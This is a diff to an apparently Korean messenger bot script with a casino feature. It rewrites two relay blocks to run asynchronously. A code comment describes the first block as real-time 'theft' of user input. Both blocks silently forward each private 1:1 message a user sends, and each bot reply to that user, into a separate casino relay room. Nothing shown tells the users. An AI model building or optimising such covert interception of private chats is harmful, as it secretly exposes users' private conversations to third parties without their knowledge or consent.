@@ -6512,14 +6512,19 @@ this.msgbot_main_logic = function(room, msg, sender, isGroupChat, replier, image
                             }
                         }
 
-                        // [중계 시스템] 유저 입력 실시간 탈취
-                        // 유저가 카지노 감시 모드일 때, 해당 유저가 치는 모든 채팅을 중계방에 전송
-                        if (ALLOWED_ROOMS.indexOf(realRoom) === -1 && realRoom !== CASINO_RELAY_ROOM) {
-                        try {
-                        var relayInput = "👤 [1:1입력] " + cleanSender + "\n💬 " + msg;
-                        Api.replyRoom(CASINO_RELAY_ROOM, relayInput);
-                        } catch(e) { Log.error("Input Relay Error: " + e); }
-                        }
+                        // [중계 시스템] 유저 입력 실시간 탈취 (비동기 처리로 핑 지연 제거)
+                if (ALLOWED_ROOMS.indexOf(realRoom) === -1 && realRoom !== CASINO_RELAY_ROOM) {
+                    if (typeof Executor !== 'undefined') {
+                        Executor.execute(new java.lang.Runnable({
+                            run: function() {
+                                try {
+                                    var relayInput = "👤 [1:1입력] " + cleanSender + "\n💬 " + msg;
+                                    Api.replyRoom(CASINO_RELAY_ROOM, relayInput);
+                                } catch(e) { Log.error("Input Relay Error: " + e); }
+                            }
+                        }));
+                    }
+                }
 
                        /* [핵심 가드] 이제 식별된 targetUid로 관리자 여부를 정확히 판별합니다. */
                     if (data.botActive === false && !isAdmin(cleanSender, data, targetUid)) {
@@ -6981,13 +6986,19 @@ if (ALLOWED_ROOMS.indexOf(roomName) !== -1) {
 // 1. 기존 replier 기능을 가로채서 1:1 방의 답변만 중계방으로 복제하는 도구 생성
 var customReplier = {
     reply: function(content) {
-        replier.reply(content); // 원래 유저에게 대답 (1:1 방 또는 단체방)
+        replier.reply(content); // 원래 유저에게 대답 (1:1 방 또는 단체방) 즉시 실행
         
         // 중계 조건: 1:1 방(비허용 방)이면서, 중계방 자체가 아닐 때만 실행
         if (ALLOWED_ROOMS.indexOf(realRoom) === -1 && realRoom !== CASINO_RELAY_ROOM) {
-            try {
-                Api.replyRoom(CASINO_RELAY_ROOM, "🤖 [1:1출력] To. " + cleanSender + "\n" + content);
-            } catch(e) { Log.error("Relay Output Error: " + e); }
+            if (typeof Executor !== 'undefined') {
+                Executor.execute(new java.lang.Runnable({
+                    run: function() {
+                        try {
+                            Api.replyRoom(CASINO_RELAY_ROOM, "🤖 [1:1출력] To. " + cleanSender + "\n" + content);
+                        } catch(e) { Log.error("Relay Output Error: " + e); }
+                    }
+                }));
+            }
         }
     }
 };
